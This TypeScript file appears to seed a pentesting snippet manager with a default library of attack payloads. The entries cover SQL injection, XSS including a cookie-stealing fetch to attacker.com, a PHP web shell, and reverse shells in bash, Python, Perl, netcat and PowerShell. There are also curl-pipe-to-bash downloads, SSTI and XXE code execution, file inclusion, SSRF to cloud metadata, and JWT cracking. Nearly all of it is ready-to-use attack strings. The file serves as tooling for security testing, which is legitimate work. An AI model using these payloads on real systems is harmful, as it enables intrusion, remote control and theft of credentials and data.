import type { Snippet } from './snippets';

function s(id: string, name: string, command: string, tags: string[], notes = ''): Snippet {
  return { id, name, command, tags, notes, createdAt: '2025-01-01T00:00:00Z', updatedAt: '2025-01-01T00:00:00Z' };
}

export const DEFAULT_PAYLOADS: Snippet[] = [
  // SQLi
  s('dfl-sqli-1', 'SQLi — Auth Bypass', "' OR '1'='1", ['SQLi', 'Payloads'], 'Login bypass'),
  s('dfl-sqli-2', 'SQLi — Union 2col', "' UNION SELECT null,null--", ['SQLi', 'Payloads']),
  s('dfl-sqli-3', 'SQLi — Version', "' UNION SELECT @@version,null--", ['SQLi', 'Payloads']),
  s('dfl-sqli-4', 'SQLi — DB Name', "' UNION SELECT database(),null--", ['SQLi', 'Payloads']),
  s('dfl-sqli-5', 'SQLi — Blind Time', "' AND SLEEP(5)--", ['SQLi', 'Payloads'], 'Time-based blind'),
  // XSS
  s('dfl-xss-1', 'XSS — Basic Alert', '<script>alert(1)</script>', ['XSS', 'Payloads']),
  s('dfl-xss-2', 'XSS — Img onerror', "<img src=x onerror=alert(1)>", ['XSS', 'Payloads']),
  s('dfl-xss-3', 'XSS — SVG', '<svg onload=alert(1)>', ['XSS', 'Payloads']),
  s('dfl-xss-4', 'XSS — Cookie steal', "<script>fetch('https://attacker.com/?c='+document.cookie)</script>", ['XSS', 'Payloads']),
  s('dfl-xss-5', 'XSS — Bypass quote', 'javascript:alert`1`', ['XSS', 'Payloads']),
  // RCE
  s('dfl-rce-1', 'RCE — Linux whoami', '; whoami', ['RCE', 'Payloads']),
  s('dfl-rce-2', 'RCE — Bash rev shell', 'bash -i >& /dev/tcp/LHOST/4444 0>&1', ['RCE', 'Payloads', 'Reverse Shells']),
  s('dfl-rce-3', 'RCE — PHP system', '<?php system($_GET["cmd"]); ?>', ['RCE', 'Payloads', 'PHP']),
  s('dfl-rce-4', 'RCE — Python rev', "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"LHOST\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'", ['RCE', 'Payloads', 'Reverse Shells']),
  s('dfl-rce-5', 'RCE — curl pipe bash', 'curl http://LHOST/shell.sh | bash', ['RCE', 'Payloads']),
  // Buffer Overflow
  s('dfl-bof-1', 'BOF — Pattern create', 'msf-pattern_create -l 200', ['Buffer Overflow', 'Payloads']),
  s('dfl-bof-2', 'BOF — Pattern offset', 'msf-pattern_offset -q AABBCCDD', ['Buffer Overflow', 'Payloads']),
  s('dfl-bof-3', 'BOF — pwntools template', "from pwn import *\np = process('./binary')\np.sendline(b'A'*64 + p64(0xdeadbeef))\np.interactive()", ['Buffer Overflow', 'Payloads', 'Pwn']),
  s('dfl-bof-4', 'BOF — Find bad chars', "badchars = (b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10')", ['Buffer Overflow', 'Payloads']),
  // Reverse Shells
  s('dfl-rs-1', 'Rev Shell — nc mkfifo', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 4444 >/tmp/f', ['Reverse Shells', 'Payloads']),
  s('dfl-rs-2', 'Rev Shell — Python2', "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", ['Reverse Shells', 'Payloads']),
  s('dfl-rs-3', 'Rev Shell — perl', 'perl -e \'use Socket;$i="LHOST";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'', ['Reverse Shells', 'Payloads']),
  s('dfl-rs-4', 'Rev Shell — PowerShell', '$client = New-Object System.Net.Sockets.TCPClient("LHOST",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()', ['Reverse Shells', 'Payloads', 'Windows']),
  // SSTI
  s('dfl-ssti-1', 'SSTI — Jinja2 detect', '{{7*7}}', ['SSTI', 'Payloads']),
  s('dfl-ssti-2', 'SSTI — Jinja2 RCE', "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", ['SSTI', 'Payloads']),
  s('dfl-ssti-3', 'SSTI — Twig', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', ['SSTI', 'Payloads']),
  // File Inclusion
  s('dfl-lfi-1', 'LFI — /etc/passwd', '../../../../etc/passwd', ['File Inclusion', 'LFI', 'Payloads']),
  s('dfl-lfi-2', 'LFI — PHP wrapper', 'php://filter/convert.base64-encode/resource=index.php', ['File Inclusion', 'LFI', 'Payloads']),
  s('dfl-lfi-3', 'RFI — Remote include', 'http://LHOST/shell.php', ['File Inclusion', 'RFI', 'Payloads']),
  s('dfl-lfi-4', 'LFI — Log poison', '/var/log/apache2/access.log', ['File Inclusion', 'LFI', 'Payloads'], 'After poisoning User-Agent'),
  // SSRF
  s('dfl-ssrf-1', 'SSRF — localhost', 'http://127.0.0.1/', ['SSRF', 'Payloads']),
  s('dfl-ssrf-2', 'SSRF — AWS metadata', 'http://169.254.169.254/latest/meta-data/', ['SSRF', 'Payloads', 'Cloud']),
  s('dfl-ssrf-3', 'SSRF — file://', 'file:///etc/passwd', ['SSRF', 'Payloads']),
  // XXE
  s('dfl-xxe-1', 'XXE — Basic', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', ['XXE', 'Payloads']),
  s('dfl-xxe-2', 'XXE — OOB', '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://LHOST/xxe">]><foo>&xxe;</foo>', ['XXE', 'Payloads']),
  // JWT Attacks
  s('dfl-jwt-1', 'JWT — alg:none', 'Change algorithm to "none" and remove signature', ['JWT Attacks', 'JWT', 'Payloads']),
  s('dfl-jwt-2', 'JWT — Crack HS256', "hashcat -a 0 -m 16500 'eyJ...' /usr/share/wordlists/rockyou.txt", ['JWT Attacks', 'JWT', 'Payloads']),
  // LDAP
  s('dfl-ldap-1', 'LDAP Injection', "*)(&(objectClass=user)(cn=*", ['LDAP', 'Payloads']),
  s('dfl-ldap-2', 'LDAP Auth bypass', "*))(|(cn=*", ['LDAP', 'Payloads']),
  // XPATH
  s('dfl-xpath-1', 'XPATH Injection', "' or '1'='1", ['XPATH', 'Payloads']),
  s('dfl-xpath-2', 'XPATH — String-length', "' or string-length(name(/*[1]))>0 or '", ['XPATH', 'Payloads']),
];

export const PAYLOAD_TAGS = ['SQLi', 'XSS', 'RCE', 'Buffer Overflow', 'Reverse Shells', 'SSTI', 'File Inclusion', 'SSRF', 'XXE', 'JWT Attacks', 'LDAP', 'XPATH'];
